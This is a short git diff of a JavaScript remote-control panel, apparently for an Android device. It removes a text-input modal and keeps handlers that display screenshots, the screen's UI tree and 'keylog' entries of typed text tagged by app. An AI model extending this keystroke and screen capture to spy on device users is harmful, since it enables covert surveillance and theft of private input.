@@ -213,7 +213,6 @@ function conectar() {
       case 'sessao_iniciada':     onSessao(msg); break;
       case 'arvore_tela':         desenhar(JSON.parse(msg.elementos), msg.pacote); break;
       case 'screenshot':          mostrarScreenshot(msg.frame); break;
-      case 'campo_texto_focado':  abrirModal(msg.texto_atual || ''); break;
       case 'keylog':              logKey(msg.texto, msg.app || '?'); break;
       case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
     }
@@ -416,20 +415,6 @@ function handleToque(e) {
   log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
 }
 
-// ── Modal de texto ─────────────────────────────────────────────────────────
-
-function abrirModal(textoAtual) {
-  const modal = document.getElementById('modal-texto');
-  const input = document.getElementById('input-texto-remoto');
-  input.value = textoAtual;
-  modal.classList.add('show');
-  setTimeout(() => input.focus(), 50);
-  log('Campo de texto focado', 'ev');
-}
-
-function fecharModal() {
-  document.getElementById('modal-texto').classList.remove('show');
-}
 
 function enviarTexto() {
   const val = document.getElementById('input-texto-remoto').value;
